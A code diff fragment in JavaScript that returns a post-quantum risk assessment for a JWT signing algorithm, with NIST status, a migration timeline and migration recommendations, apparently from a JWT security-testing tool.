+                nist_status: vulnInfo.nistStatus,
+                harvest_now_decrypt_later_risk: 'HIGH - Data encrypted today may be vulnerable within 10 years'
+            };
+        } else if (quantumResistantAlgs[currentAlg]) {
+            const resistantInfo = quantumResistantAlgs[currentAlg];
+            assessment = {
+                status: 'QUANTUM_RESISTANT',
+                risk_level: 'LOW',
+                algorithm: currentAlg,
+                details: resistantInfo,
+                nist_status: resistantInfo.nistStatus,
+                harvest_now_decrypt_later_risk: 'LOW - HMAC algorithms are quantum-resistant'
+            };
+        } else {
+            assessment = {
+                status: 'UNKNOWN',
+                risk_level: 'MEDIUM',
+                algorithm: currentAlg,
+                recommendation: 'Algorithm not recognized - manual assessment required'
+            };
+        }
+
+        
+        const migrationTimeline = {
+            '2025': 'Discovery phase - inventory quantum-vulnerable systems',
+            '2028': 'High-priority system migration deadline',
+            '2030': 'NIST deprecation of 112-bit security algorithms',
+            '2031': 'UK government mandate for high-priority migrations',
+            '2035': 'Full transition to post-quantum cryptography required'
+        };
+
+        return {
+            description: attackDescription,
+            token: 'Assessment only - no attack token generated',
+            impact: assessment.risk_level === 'CRITICAL' ? 
+                'Current JWT signatures will be breakable by quantum computers within 10-15 years' : 
+                'JWT signatures are quantum-resistant',
+            usage: 'Use for post-quantum migration planning and compliance assessment',
+            assessment: assessment,
+            nist_standards_2025: {
+                finalized_algorithms: pqcRecommendations,
+                standards_published: 'FIPS 203, 204, 205 (August 2024)',
+                backup_algorithm: 'HQC selected as ML-KEM backup (March 2025)'
+            },
+            migration_timeline: migrationTimeline,
+            recommendations: assessment.status === 'VULNERABLE' ? [
+                'Plan immediate migration to quantum-resistant algorithms',
+                'Implement crypto-agility for future algorithm updates',
+                'Consider HMAC-based JWT signatures for immediate protection',
+                'Prepare for NIST post-quantum standards implementation',
+                'Assess "harvest now, decrypt later" data exposure risk'
+            ] : [
+                'Current algorithm is quantum-resistant',
+                'Monitor NIST post-quantum standards for updates',
+                'Maintain crypto-agility for future transitions'
+            ],
+            compliance: {
+                nist_compliance: assessment.nist_status,
+                government_mandates: 'US federal agencies must transition by 2035',
+                enterprise_timeline: 'Most enterprises should complete migration by 2031'
+            }
+        };
     }
 }
 
